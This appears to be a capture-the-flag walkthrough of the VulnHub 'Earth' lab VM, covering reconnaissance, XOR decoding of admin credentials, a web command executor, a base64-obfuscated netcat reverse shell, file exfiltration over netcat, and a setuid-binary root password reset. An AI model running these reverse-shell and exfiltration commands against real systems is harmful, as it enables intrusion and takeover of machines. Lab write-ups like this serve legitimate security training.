# The Planets: Earth  - VulnHub

Reference: [Earth](https://www.vulnhub.com/entry/the-planets-earth,755/)

```bash
┌──(kali㉿2a02-8440-6441-a02f-0a00-27ff-fe62-0f00)-[~]
└─$ nmap 172.20.10.0/24
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-27 18:55 CET

Nmap scan report for 172.20.10.4
Host is up (0.000079s latency).
All 1000 scanned ports on 172.20.10.4 are in ignored states.
Not shown: 1000 closed tcp ports (conn-refused)

Nmap scan report for 172.20.10.5
Host is up (0.0075s latency).
Not shown: 986 filtered tcp ports (no-response), 11 filtered tcp ports (host-unreach)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap done: 256 IP addresses (3 hosts up) scanned in 8.30 seconds
```
```bash

┌──(kali㉿2a02-8440-6441-a02f-0a00-27ff-fe62-0f00)-[~]
└─$ nmap -A 172.20.10.5 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-27 18:56 CET
Nmap scan report for 172.20.10.5
Host is up (1.0s latency).
Not shown: 913 filtered tcp ports (no-response), 84 filtered tcp ports (host-unreach)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.6 (protocol 2.0)
| ssh-hostkey: 
|   256 5b:2c:3f:dc:8b:76:e9:21:7b:d0:56:24:df:be:e9:a8 (ECDSA)
|_  256 b0:3c:72:3b:72:21:26:ce:3a:84:e8:41:ec:c8:f8:41 (ED25519)
80/tcp  open  http     Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9)
|_http-title: Bad Request (400)
|_http-server-header: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9
443/tcp open  ssl/http Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9)
| ssl-cert: Subject: commonName=earth.local/stateOrProvinceName=Space
| Subject Alternative Name: DNS:earth.local, DNS:terratest.earth.local
| Not valid before: 2021-10-12T23:26:31
|_Not valid after:  2031-10-10T23:26:31
|_ssl-date: TLS randomness does not represent time
|_http-title: Bad Request (400)
|_http-server-header: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9
| tls-alpn: 
|_  http/1.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 94.43 seconds
```

```bash
┌──(kali㉿2a02-8440-6441-a02f-0a00-27ff-fe62-0f00)-[~]
└─$ dirb http://172.20.10.5:80 


-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Dec 27 18:58:50 2023
URL_BASE: http://172.20.10.5:80/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://172.20.10.5:80/ ----
+ http://172.20.10.5:80/cgi-bin/ (CODE:403|SIZE:199)                                                       
                                                                                                           
-----------------
END_TIME: Wed Dec 27 18:59:55 2023
DOWNLOADED: 4612 - FOUND: 1
```

```bash
┌──(kali㉿2a02-8440-6441-a02f-0a00-27ff-fe62-0f00)-[~]
└─$ dirb https://172.20.10.5:443


-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Dec 27 18:59:40 2023
URL_BASE: https://172.20.10.5:443/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: https://172.20.10.5:443/ ----
+ https://172.20.10.5:443/cgi-bin/ (CODE:403|SIZE:199)                                                     
                                                                                                           
-----------------
END_TIME: Wed Dec 27 19:01:02 2023
DOWNLOADED: 4612 - FOUND: 1
```

```bash
┌──(kali㉿2a02-8440-6441-a02f-0a00-27ff-fe62-0f00)-[~]
└─$ nikto -url http://172.20.10.5:80

- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          172.20.10.5
+ Target Hostname:    172.20.10.5
+ Target Port:        80
+ Start Time:         2023-12-27 19:02:02 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /ukF9D6YW.php#: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ Apache/2.4.51 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ Python/3.9 appears to be outdated (current is at least 3.9.6).
+ OpenSSL/1.1.1l appears to be outdated (current is at least 3.0.7). OpenSSL 1.1.1s is current for the 1.x branch and will be supported until Nov 11 2023.
+ /: Cookie csrftoken created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing
+ /icons/: Directory indexing found.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ 8907 requests: 0 error(s) and 9 item(s) reported on remote host
+ End Time:           2023-12-27 19:04:07 (GMT1) (125 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```



When you analyse the ssl certificates it seems that we're missing a DNS to reach some sites. lets add it to our hosts

```bash
echo "172.20.10.5 terratest.earth.local" > /etc/hosts
echo "172.20.10.5 earth.local" >> /etc/hosts 
```

```bash
┌──(kali㉿2a02-8440-6441-a02f-0a00-27ff-fe62-0f00)-[~]
└─$ dirb http://earth.local/    

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Dec 27 19:16:06 2023
URL_BASE: http://earth.local/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://earth.local/ ----
+ http://earth.local/admin (CODE:301|SIZE:0)                                                               
+ http://earth.local/cgi-bin/ (CODE:403|SIZE:199)                                                          
                                                                                                           
-----------------
END_TIME: Wed Dec 27 19:16:21 2023
DOWNLOADED: 4612 - FOUND: 2
```

```bash
┌──(kali㉿2a02-8440-6441-a02f-0a00-27ff-fe62-0f00)-[~]
└─$ nikto -url http://earth.local/
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          172.20.10.5
+ Target Hostname:    earth.local
+ Target Port:        80
+ Start Time:         2023-12-27 19:15:35 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9
+ /: Cookie csrftoken created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ /s1ihXKAR.php#: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ Python/3.9 appears to be outdated (current is at least 3.9.6).
+ OpenSSL/1.1.1l appears to be outdated (current is at least 3.0.7). OpenSSL 1.1.1s is current for the 1.x branch and will be supported until Nov 11 2023.
+ Apache/2.4.51 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing
+ /admin/: This might be interesting.
+ /icons/: Directory indexing found.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ 8768 requests: 0 error(s) and 9 item(s) reported on remote host
+ End Time:           2023-12-27 19:16:45 (GMT1) (70 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

There's a home page at http://earth.local/ where we can find some encoded messages. Let's try to decode them. 

When we perform a dirb at the address https://terratest.earth.local/, it seems like there's something living at: https://terratest.earth.local/robots.txt

The content of this file is:

```
User-Agent: *
Disallow: /*.asp
Disallow: /*.aspx
Disallow: /*.bat
Disallow: /*.c
Disallow: /*.cfm
Disallow: /*.cgi
Disallow: /*.com
Disallow: /*.dll
Disallow: /*.exe
Disallow: /*.htm
Disallow: /*.html
Disallow: /*.inc
Disallow: /*.jhtml
Disallow: /*.jsa
Disallow: /*.json
Disallow: /*.jsp
Disallow: /*.log
Disallow: /*.mdb
Disallow: /*.nsf
Disallow: /*.php
Disallow: /*.phtml
Disallow: /*.pl
Disallow: /*.reg
Disallow: /*.sh
Disallow: /*.shtml
Disallow: /*.sql
Disallow: /*.txt
Disallow: /*.xml
Disallow: /testingnotes.*
```

https://terratest.earth.local/testingnotes.txt

```
Testing secure messaging system notes:
*Using XOR encryption as the algorithm, should be safe as used in RSA.
*Earth has confirmed they have received our sent messages.
*testdata.txt was used to test encryption.
*terra used as username for admin portal.
Todo:
*How do we send our monthly keys to Earth securely? Or should we change keys weekly?
*Need to test different key lengths to protect against bruteforce. How long should the key be?
*Need to improve the interface of the messaging interface and the admin panel, it's currently very basic.
```

https://terratest.earth.local/testdata.txt

```
According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth's history, life appeared in the oceans and began to affect Earth's atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago.
```

Now we have the login (terra) the encryption method, (XOR) the encryption key (https://terratest.earth.local//testdata.txt) and some message to decode (http://earth.local/). Let's try to decode these messages with CyberChief.


[CyberChief](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')XOR(%7B'option':'UTF8','string':'According%20to%20radiometric%20dating%20estimation%20and%20other%20evidence,%20Earth%20formed%20over%204.5%20billion%20years%20ago.%20Within%20the%20first%20billion%20years%20of%20Earth%5C's%20history,%20life%20appeared%20in%20the%20oceans%20and%20began%20to%20affect%20Earth%5C's%20atmosphere%20and%20surface,%20leading%20to%20the%20proliferation%20of%20anaerobic%20and,%20later,%20aerobic%20organisms.%20Some%20geological%20evidence%20indicates%20that%20life%20may%20have%20arisen%20as%20early%20as%204.1%20billion%20years%20ago.'%7D,'Standard',false)&input=MjQwMjExMWIxYTA3MDUwNzBhNDEwMDBhNDMxYTAwMGEwZTBhMGYwNDEwNDYwMTE2NGQwNTBmMDcwYzBmMTU1NDBkMTAxODAwMDAwMDAwMGMwYzA2NDEwZjA5MDE0MjBlMTA1YzBkMDc0ZDA0MTgxYTAxMDQxYzE3MGQ0ZjRjMmMwYzEzMDAwZDQzMGUwZTFjMGEwMDA2NDEwYjQyMGQwNzRkNTU0MDQ2NDUwMzFiMTgwNDBhMDMwNzRkMTgxMTA0MTExYjQxMGYwMDBhNGM0MTMzNWQxYzFkMDQwZjRlMDcwZDA0NTIxMjAxMTExZjFkNGQwMzFkMDkwZjAxMGUwMDQ3MWMwNzAwMTY0NzQ4MWEwYjQxMmIxMjE3MTUxYTUzMWI0MzA0MDAxZTE1MWIxNzFhNDQ0MTAyMGUwMzA3NDEwNTQ0MTgxMDBjMTMwYjE3NDUwODFjNTQxYzBiMDk0OTAyMDIxMTA0MGQxYjQxMGYwOTAxNDIwMzAxNTMwOTFiNGQxNTAxNTMwNDA3MTQxMTBiMTc0YzJjMGMxMzAwMGQ0NDFiNDEwZjEzMDgwZDEyMTQ1YzBkMDcwODQxMGYxZDAxNDEwMTAxMWEwNTBkMGEwODRkNTQwOTA2MDkwNTA3MDkwMjQyMTUwYjE0MWMxZDA4NDExZTAxMGEwZDFiMTIwZDExMGQxZDA0MGUxYTQ1MGMwZTQxMGYwOTA0MDcxMzBiNTYwMTE2NGQwMDAwMTc0OTQxMWUxNTFjMDYxZTQ1NGQwMDExMTcwYzBhMDgwZDQ3MGExMDA2MDU1YTAxMDYwMDEyNDA1MzM2MGUxZjExNDgwNDA5MDYwMTBlMTMwYzAwMDkwZDRlMDIxMzBiMDUwMTVhMGIxMDRkMDgwMDE3MGMwMjEzMDAwZDEwNGMxZDA1MDAwMDQ1MGYwMTA3MGI0NzA4MDMxODQ0NWMwOTAzMDg0MTBmMDEwYzEyMTcxYTQ4MDIxZjQ5MDgwMDA2MDkxYTQ4MDAxZDQ3NTE0YzUwNDQ1NjAxMTkwMTA4MDExZDQ1MTgxNzE1MWExMDRjMDgwYTBlNWE)

Interesting message

```
2402111b1a0705070a41000a431a000a0e0a0f04104601164d050f070c0f15540d1018000000000c0c06410f0901420e105c0d074d04181a01041c170d4f4c2c0c13000d430e0e1c0a0006410b420d074d55404645031b18040a03074d181104111b410f000a4c41335d1c1d040f4e070d04521201111f1d4d031d090f010e00471c07001647481a0b412b1217151a531b4304001e151b171a4441020e030741054418100c130b1745081c541c0b0949020211040d1b410f090142030153091b4d150153040714110b174c2c0c13000d441b410f13080d12145c0d0708410f1d014101011a050d0a084d540906090507090242150b141c1d08411e010a0d1b120d110d1d040e1a450c0e410f090407130b5601164d00001749411e151c061e454d0011170c0a080d470a1006055a010600124053360e1f1148040906010e130c00090d4e02130b05015a0b104d0800170c0213000d104c1d050000450f01070b47080318445c090308410f010c12171a48021f49080006091a48001d47514c50445601190108011d451817151a104c080a0e5a
```

Output

```
earthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimat
```

In this message we can identify the following string: 
- earthclimatechangebad4humans

The other messages don't give any good results.

Creditentials:

```
login: terra
password: earthclimatechangebad4humans
```

Then we come back to the address http://earth.local/admin/login, to login with the given creditentials. We're logged in !

Let's find the user flag with the command executor given on the website:

```bash
find ./ -name user_flag.txt
Command output: ./var/earth_web/user_flag.txt 
```

```bash
cat ./var/earth_web/user_flag.txt
Command output: [user_flag_3353b67d6437f07ba7d34afd7d2fc27d] 
```

Then let's try to perform a privilege escalation using a file with root creditentials. 

```bash
find / -perm -u=s -type f 2>/dev/null
Command output: /usr/bin/chage /usr/bin/gpasswd /usr/bin/newgrp /usr/bin/su /usr/bin/mount /usr/bin/umount /usr/bin/pkexec /usr/bin/passwd /usr/bin/chfn /usr/bin/chsh /usr/bin/at /usr/bin/sudo /usr/bin/reset_root /usr/sbin/grub2-set-bootflag /usr/sbin/pam_timestamp_check /usr/sbin/unix_chkpwd /usr/sbin/mount.nfs /usr/lib/polkit-1/polkit-agent-helper-1 
```

The file named reset_root could be interesting but it's completly impossible to read it. Let's open a reverse shell. NetCat is install on target host but fereign connection are not allowed, we will pass trouht using an encoded command:

```bash
┌──(kali㉿2a02-8440-6441-a02f-0a00-27ff-fe62-0f00)-[~]
└─$ echo "nc 172.20.10.4 9999 -e bin/bash" | base64                   
bmMgMTcyLjIwLjEwLjQgOTk5OSAtZSBiaW4vYmFzaAo=
```

Run the following command in the interpreter of the Earth VM

```bash
echo 'bmMgMTcyLjIwLjEwLjQgOTk5OSAtZSBiaW4vYmFzaAo=' | base64 -d | bash
```

At the same time open a new terminal on your device and open a NetCat listen:

```bash
┌──(kali㉿2a02-8440-6441-a02f-0a00-27ff-fe62-0f00)-[~]
└─$ nc -l -vv -p 9999
listening on [any] 9999 ...
connect to [172.20.10.4] from terratest.earth.local [172.20.10.5] 54490
python3 -c 'import pty;pty.spawn("/bin/bash")'
bash-5.1$ 
```

Let's read the content of the /usr/bin/reset_root file: 

```bash
bash-5.1$ cat /usr/bin/reset_root
cat /usr/bin/reset_root
 setuidputssystemaccess__libc_start_mainlibc.so.6GLIBC_2.2.5__gmon_start__-u�i�t7�?@�?@@@ @@(@@0@@��H�H��/H��t��H���5�/�%�/@�%�/h������%�/h������%�/h������%�/h������1�I��^H��H���PTI��p@H��@H��V@�R/�����f.���@@@H=@@@t�H��t	�@@@��f��ff.�@�@@@H��@@@H��H��?H��H�H��t�H��t�@@@���ff.�@���=/uUH���z�����.]Ð�ff.�@���UH��H���H�paleblueH�E��E�dotH�	       H�]\UH�E�H�U��E�^H�credentiH�als rootH�E�H�U�H�:theEartH�hisflatH�E�H�U��E�H�[
H�N*                                                                                                         C
    1wpH��p���H��x���ƅ����uH�[
H�N([gbH��P���H��X���ƅ`���H�C H��C���ǅK���Q%O���H�U�H�u�H�E�A�
                                                              �H����E�� @����H������H�u�H��p���A��H����ƅ����H�������H��������u�E�H������H�u�H��P���A��H���ƅ���H���Zƅ����H�������H����H������H�u�H��C���A��
�����u�E��}�u �8 @������������x @������
�� @�������UH��H�}�H�u�H�U؉M�D�E��E��@�E�Hc�H�E�H��0�EЍH��E������Hc�H�E�H���E�Hc�H�E�H�1��E��E�;E�|���]�f.�D��AWL�=*AVI��AUI��ATA��UH�-�)SL)�H������H��t1��L��L��D��A��H��H9�u�H�[]A\A]A^A_�ff.������H�H��CHECKING IF RESET TRIGGERS PRESENT...RESET TRIGGERS ARE PRESENT, RESETTING ROOT PASSWORD TO: Earth/usr/bin/echo 'root:Earth' | /usr/sbin/chpasswdRESET FAILED, ALL TRIGGERS ARE NOT PRESENT.@L��������\����p����������,��������4zRx
                                                                                                                8���/D0T���$D����PFJ
*                                                                                                                                   �?�;*3$"l����/A�C
g����lA�C
D�8���eF�I�E �E(�D0�H8�G@n8A0A(B BB�`���P@ @-
x@>�>���o�@h@�@                              @
R
 @@`@�0	���o�@���o���o�@ >@6@F@V@f@GCC: (GNU) 11.1.1 20210531 (Red Hat 11.1.1-3)GCC: (GNU) 11.2.1 20210728 (Red Hat 11.2.1-1)
GA$3g979�@�@ GA$running gcc 11.1.1 20210531 GA$annobin gcc 11.1.1 20210531
GA*FORTIFY�GA+GLIBCXX_ASSERTIONSGA*GAGA+omit_frame_pointerGA*GA!stack_realignGOWjEGA+stack_clashGA*cf_protection
GA$3g979p@p@ GA$running gcc 11.1.1 20210531 GA$annobin gcc 11.1.1 20210531
GA*FORTIFY�GA+GLIBCXX_ASSERTIONSGA*GAGA+omit_frame_pointerGA*GA!stack_realignGOWjEGA+stack_clashGA*cf_protection
GA$3g979p@p@ GA$running gcc 11.1.1 20210531 GA$annobin gcc 11.1.1 20210531
GA*FORTIFY�GA+GLIBCXX_ASSERTIONSGA*GAGA+omit_frame_pointerGA*GA!stack_realignGOWjEGA+stack_clashGA*cf_protection
GA$3g979p@p@ GA$running gcc 11.1.1 20210531 GA$annobin gcc 11.1.1 20210531
GA*FORTIFY�GA+GLIBCXX_ASSERTIONSGA*GAGA+omit_frame_pointerGA*GA!stack_realignGOWjEGA+stack_clashGA*cf_protection
GA$3g979p@p@ GA$running gcc 11.1.1 20210531 GA$annobin gcc 11.1.1 20210531
GA*FORTIFY�GA+GLIBCXX_ASSERTIONSGA*GAGA+omit_frame_pointerGA*GA!stack_realignGOWjEGA+stack_clashGA*cf_protection
GA$3g979�@�@ GA$running gcc 11.1.1 20210531 GA$annobin gcc 11.1.1 20210531
GA*FORTIFY�GA+GLIBCXX_ASSERTIONSGA*GAGA+omit_frame_pointerGA*GA!stack_realignGOWjEGA+stack_clashGA*cf_protection
GA$3g979p@p@ GA$running gcc 11.1.1 20210531 GA$annobin gcc 11.1.1 20210531
GA*FORTIFY�GA+GLIBCXX_ASSERTIONSGA*GAGA+omit_frame_pointerGA*GA!stack_realignGOWjEGA+stack_clashGA*cf_protection
GA$3g979p@p@ GA$running gcc 11.1.1 20210531 GA$annobin gcc 11.1.1 20210531
GA*FORTIFY�GA+GLIBCXX_ASSERTIONSGA*GAGA+omit_frame_pointerGA*GA!stack_realignGOWjEGA+stack_clashGA*cf_protection
GA$3g979p@p@ GA$running gcc 11.1.1 20210531 GA$annobin gcc 11.1.1 20210531
GA*FORTIFY�GA+GLIBCXX_ASSERTIONSGA*GAGA+omit_frame_pointerGA*GA!stack_realignGOWjEGA+stack_clashGA*cf_protection
GA$3g979p@p@ GA$running gcc 11.1.1 20210531 GA$annobin gcc 11.1.1 20210531
GA*FORTIFY�GA+GLIBCXX_ASSERTIONSGA*GAGA+omit_frame_pointerGA*GA!stack_realignGOWjEGA+stack_clashGA*cf_protection
GA$3g979�@�@ GA$running gcc 11.1.1 20210531 GA$annobin gcc 11.1.1 20210531
GA*FORTIFY�GA+GLIBCXX_ASSERTIONSGA*GAGA+omit_frame_pointerGA*GA!stack_realignGA*�@�@+stack_clashGA*cf_protection
GA$3g979p@p@ GA$running gcc 11.1.1 20210531 GA$annobin gcc 11.1.1 20210531
GA*FORTIFY�GA+GLIBCXX_ASSERTIONSGA*GAGA+omit_frame_pointerGA*GA!stack_realignGOWjEGA+stack_clashGA*cf_protection
GA$3g979p@p@ GA$running gcc 11.1.1 20210531 GA$annobin gcc 11.1.1 20210531
GA*FORTIFY�GA+GLIBCXX_ASSERTIONSGA*GAGA+omit_frame_pointerGA*GA!stack_realignGOWjEGA+stack_clashGA*cf_protection
GA$3g979p@p@ GA$running gcc 11.1.1 20210531 GA$annobin gcc 11.1.1 20210531
GA*FORTIFY�GA+GLIBCXX_ASSERTIONSGA*GAGA+omit_frame_pointerGA*GA!stack_realignGOWjEGA+stack_clashGA*cf_protection
GA$3g979p@p@ GA$running gcc 11.1.1 20210531 GA$annobin gcc 11.1.1 20210531
GA*FORTIFY�GA+GLIBCXX_ASSERTIONSGA*GAGA+omit_frame_pointerGA*GA!stack_realigGA$3a1p@�GA$3a1�@�GA$3a1@GA$3a1x@�GA$3a1�@VGA$3a1@uGA$3a1u@uGA$3a1u@uGA$3a1GA$3a1�@�@@8@X@|@�@�@h�@	�@
�@
  @
 @p@x@ @� @!@>@>@ >@�?@@@8@@<@@�`@��>�@K�@\p@mp@�p@�p@�p@�p@�p@�p|@ >�@K�@\p@mp@�p@�p@�p@�p@�p@�p@>�@K�@\p@mp@�p@�p@�p@�p@�p@�p@�@9�@^��i�@k�@~ @�<@@�>@�P@�>@���^��"@��>@  >@)>@<� @O@@ep@� 8@@u�<@@ox@����@l�8@@�  @� @@eW@@@�@�p@/+<@@7V@/<O@@@[
@/usr/lib/gcc/x86_64-redhat-linux/11/../../../../lib64/crt1.o.annobin_lto.annobin_lto_end.annobin_lto.hot.annobin_lto_end.hot.annobin_lto.unlikely.annobin_lto_end.unlikely.annobin_lto.startup.annobin_lto_end.startup.annobin_lto.exit.annobin_lto_end.exit__abi_tag.annobin__dl_relocate_static_pie.start.annobin__dl_relocate_static_pie.endcrtstuff.cderegister_tm_clones__do_global_dtors_auxcompleted.0__do_global_dtors_aux_fini_array_entryframe_dummy__frame_dummy_init_array_entryreset_root_3.c__FRAME_END____init_array_end_DYNAMIC__init_array_start__GNU_EH_FRAME_HDR_GLOBAL_OFFSET_TABLE___libc_csu_finiputs@GLIBC_2.2.5_edatasystem@GLIBC_2.2.5__libc_start_main@GLIBC_2.2.5magic_cipher__data_start__gmon_start____dso_handle_IO_stdin_used__libc_csu_init_dl_relocate_static_pie__bss_startmainaccess@GLIBC_2.2.5__TMC_END__setuid@GLIBC_2.2.5.symtab.strtab.shstrtab.interp.note.gnu.property.note.gnu.build-id.note.ABI-tag.gnu.hash.dynsym.dynstr.gnu.version.gnu.version_r.rela.dyn.rela.plt.init.text.fini.rodata.eh_frame_hdr.eh_frame.init_array.fini_array.dynamic.got.got.plt.data.bss.comment.gnu.build.attributes@#8@86X@X$I|@| W���o�@a
0<0\@`@�0xJx!���O>@ .��?�Sn�V,bash-5.1$ o�@���@��B@�@ @ P�p@p�x@x
```

Impossible to get any infos from this. Let's try to run it.

```bash
bash-5.1$ /usr/bin/reset_root
/usr/bin/reset_root
CHECKING IF RESET TRIGGERS PRESENT...
RESET FAILED, ALL TRIGGERS ARE NOT PRESENT.
```

To invetigate on this file we have to get it on our device, NetCat offers to do this:

On your device listen on the port 9999 for a file transfer like this:

```bash
nc -lvnp 9999 > reset_root
```

Then in your reverse shell send the file with this command:

```bash
nc -w 3 172.20.10.4 9999 < /usr/bin/reset_root
```

We will be using ltrace to find dependencies of the file, firstly change the execution rights of the file:

```bash
┌──(kali㉿2a02-8440-6441-a02f-0a00-27ff-fe62-0f00)-[~/Documents/hacks/earth]
└─$ chmod +x ./reset_root   
```                                                                                               
```bash                                                    
┌──(kali㉿2a02-8440-6441-a02f-0a00-27ff-fe62-0f00)-[~/Documents/hacks/earth]
└─$ ltrace ./reset_root  
puts("CHECKING IF RESET TRIGGERS PRESE"...CHECKING IF RESET TRIGGERS PRESENT...
)                                                      = 38
access("/dev/shm/kHgTFI5G", 0)                                                                   = -1
access("/dev/shm/Zw7bV9U5", 0)                                                                   = -1
access("/tmp/kcM0Wewe", 0)                                                                       = -1
puts("RESET FAILED, ALL TRIGGERS ARE N"...RESET FAILED, ALL TRIGGERS ARE NOT PRESENT.
)                                                      = 44
+++ exited (status 0) +++
```

The script reset_root seems to be missing 3 dependencies, let's create them on the Earth device 

```bash
touch /dev/shm/kHgTFI5G
touch /dev/shm/Zw7bV9U5
touch /tmp/kcM0Wewe
```
Now run to the flag: 

```
bash-5.1$ /usr/bin/reset_root
/usr/bin/reset_root
CHECKING IF RESET TRIGGERS PRESENT...
RESET TRIGGERS ARE PRESENT, RESETTING ROOT PASSWORD TO: Earth
bash-5.1$ su root
su root
Password: Earth

[root@earth /]# find ./ -name root-flag.txt  
find ./ -name root-flag.txt
[root@earth /]# find ./ -name root_flag.txt
find ./ -name root_flag.txt
./root/root_flag.txt
[root@earth /]# cat ./root/root_flag.txt
cat ./root/root_flag.txt

              _-o#&&*''''?d:>b\_
          _o/"`''  '',, dMF9MMMMMHo_
       .o&#'        `"MbHMMMMMMMMMMMHo.
     .o"" '         vodM*$&&HMMMMMMMMMM?.
    ,'              $M&ood,~'`(&##MMMMMMH\
   /               ,MMMMMMM#b?#bobMMMMHMMML
  &              ?MMMMMMMMMMMMMMMMM7MMM$R*Hk
 ?$.            :MMMMMMMMMMMMMMMMMMM/HMMM|`*L
|               |MMMMMMMMMMMMMMMMMMMMbMH'   T,
$H#:            `*MMMMMMMMMMMMMMMMMMMMb#}'  `?
]MMH#             ""*""""*#MMMMMMMMMMMMM'    -
MMMMMb_                   |MMMMMMMMMMMP'     :
HMMMMMMMHo                 `MMMMMMMMMT       .
?MMMMMMMMP                  9MMMMMMMM}       -
-?MMMMMMM                  |MMMMMMMMM?,d-    '
 :|MMMMMM-                 `MMMMMMMT .M|.   :
  .9MMM[                    &MMMMM*' `'    .
   :9MMk                    `MMM#"        -
     &M}                     `          .-
      `&.                             .
        `~,   .                     ./
            . _                  .-
              '`--._,dd###pp=""'

Congratulations on completing Earth!
If you have any feedback please contact me at SirFlash@protonmail.com
[root_flag_b0da9554d29db2117b02aa8b66ec492e]
```